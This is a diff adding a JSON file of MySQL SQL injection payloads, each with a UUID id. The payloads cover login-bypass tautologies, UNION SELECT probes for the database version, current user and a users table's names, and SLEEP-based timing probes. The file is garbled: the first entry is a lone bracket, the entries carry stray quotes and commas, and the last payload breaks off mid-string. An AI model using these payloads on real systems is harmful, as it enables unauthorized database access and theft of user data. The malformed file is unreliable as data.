@@ -1,0 +1,70 @@
+[
+    {
+        "id": "0e2e8192-73ca-43b1-8b1b-e3ae8dec8659",
+        "payload": "["
+    },
+    {
+        "id": "99b9846c-9b85-4d7f-9172-80ae8243d339",
+        "payload": "  \"' OR 1=1 -- \","
+    },
+    {
+        "id": "122f5d75-8b8f-4183-beae-4b236e660c32",
+        "payload": "  \"' OR '1'='1' -- \","
+    },
+    {
+        "id": "990e32c8-0dc8-4d86-98d7-861e32908fc3",
+        "payload": "  \"' OR 1=1 #\","
+    },
+    {
+        "id": "a958cb7b-b1bb-4cdc-a90b-8c87bed846f7",
+        "payload": "  \"' OR '1'='1' #\","
+    },
+    {
+        "id": "2a2a226d-43b6-4bdf-acf7-ddb4f79f8596",
+        "payload": "  \"' OR 1=1 UNION SELECT 1,2 -- \","
+    },
+    {
+        "id": "43de3ac1-7949-4772-83fc-9db713aea7c1",
+        "payload": "  \"' OR 1=1 UNION SELECT 1,2 #\","
+    },
+    {
+        "id": "fda87a0c-f278-4520-83f5-bf4fcd1d79d2",
+        "payload": "  \"' OR 1=1 UNION SELECT @@version, database() -- \","
+    },
+    {
+        "id": "ed24e80a-a5f6-40d8-b776-d861593a998a",
+        "payload": "  \"' OR 1=1 UNION SELECT @@version, database() #\","
+    },
+    {
+        "id": "955dc0c7-56cd-459a-b797-fbab2c87dac0",
+        "payload": "  \"' OR 1=1 UNION SELECT user(), database() -- \","
+    },
+    {
+        "id": "2ed98f33-0466-413f-92ed-84bca71e62c8",
+        "payload": "  \"' OR 1=1 UNION SELECT user(), database() #\","
+    },
+    {
+        "id": "17945d62-181d-48f0-8538-0a85b667126a",
+        "payload": "  \"' OR 1=1 UNION SELECT first_name, last_name FROM users -- \","
+    },
+    {
+        "id": "bdbb22ca-8697-4f4e-9025-33a6c3dee737",
+        "payload": "  \"' OR 1=1 AND 1=2 -- \","
+    },
+    {
+        "id": "00db0f63-39f2-4f31-ab36-bd3007a9482d",
+        "payload": "  \"' OR 1=1 AND 1=2 #\","
+    },
+    {
+        "id": "335f3992-0f0f-46d5-8d88-a3e99f2b672d",
+        "payload": "  \"' OR SLEEP(5) -- \","
+    },
+    {
+        "id": "1d3e1b19-a854-4c3f-b443-8a878aeeba2c",
+        "payload": "  \"' OR SLEEP(5) #\","
+    },
+    {
+        "id": "d857971d-ee1f-4c56-960e-f164d9392b99",
+        "payload": "  \"' OR BENCHMARK(10"
+    }
+]
